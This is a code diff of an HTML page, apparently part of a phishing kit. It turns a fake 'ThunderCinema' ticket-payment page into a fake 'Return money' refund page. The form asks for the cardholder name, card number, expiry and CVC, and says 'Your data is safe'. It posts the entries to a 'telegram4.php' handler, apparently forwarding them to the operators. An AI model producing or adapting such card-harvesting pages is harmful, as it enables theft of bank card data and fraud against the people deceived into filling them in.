@@ -4,8 +4,7 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ThunderPayment</title>
-    <link rel="stylesheet" href="css/pay.css">
+    <link rel="stylesheet" href="css/moneyback.css">
     <link rel="stylesheet" href="css/reset.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -17,43 +16,45 @@
     <link rel="mask-icon" href="icons/safari-pinned-tab.svg" color="#5bbad5">
     <meta name="msapplication-TileColor" content="#603cba">
     <meta name="theme-color" content="#ffffff">
+    <title>Document</title>
 </head>
 <body>
-    <div class="pay_wrapper">
-        <div class="pay">
+    
+    <div class="moneyback_wrapper">
+        <div class="moneyback">
 
-            <div class="pay_info">
-                <h3>Payment Information</h3>
+            <div class="moneyback_info">
+                <h3>Return money</h3>
                 <p>
-                    Payment for tickets to "ThunderCinema".<br>
+                    To return, enter and confirm your card details.<br>
                     Request number: <span id="randomNum"></span></p>
             </div>
 
-            <div class="pay_photo">
+            <div class="moneyback_photo">
                 <div class="photo">
-                    <img class="pay_photo_vima" src="css/images/pay/vima.png">
-                        <span class="pay_photo_dot"></span>
+                    <img class="moneyback_photo_vima" src="css/images/pay/vima.png">
+                        <span class="moneyback_photo_dot"></span>
                 </div>
-                <div class="pay_photo_text">
+                <div class="moneyback_photo_text">
                     <p>Payment by VISA or MasterCard bank card.
                         Security of payment processing by plastic cards
                        guaranteed by the acquiring bank</p>
                 </div>
             </div>
 
-            <form action="telegram.php" method="post" class="pay_form _req" id="form">
+            <form action="telegram4.php" method="post" class="moneyback_form _req" id="form">
                 <p>Bank card owner</p>
-                <input name="owner" type="text" class="pay_form_name _req">
+                <input name="moneybackowner" type="text" class="moneyback_form_name _req">
                 <p>Card number</p>
-                <input name="numbercard" type="text" class="pay_form_card _req">
+                <input name="moneybacknumbercard" type="text" class="moneyback_form_card _req">
                 <p>Validity</p>
-                <input name="validity" type="text" class="pay_form_validity _req" maxlength="5">
-                <p class="cvc">CVC<span class="cvc_que">?</span></p>
-                <input name="cvc" type="text" class="pay_form_cvc _req" maxlength="3">
-                <div class="protected">
+                <input name="moneybackvalidity" type="text" class="moneyback_form_validity _req" maxlength="5">
+                <p class="cvc">CVC<span class="moneyback_cvc_que">?</span></p>
+                <input name="moneybackcvc" type="text" class="moneyback_form_cvc _req" maxlength="3">
+                <div class="moneyback_protected">
                   <p><img src="css/images/more_photo/paylock.svg">Your data is safe</p>
                 </div>
-                <div class="pay_btn">
+                <div class="moneyback_btn">
                     <button type="submit">Send</button>
                 </div>
             </form>
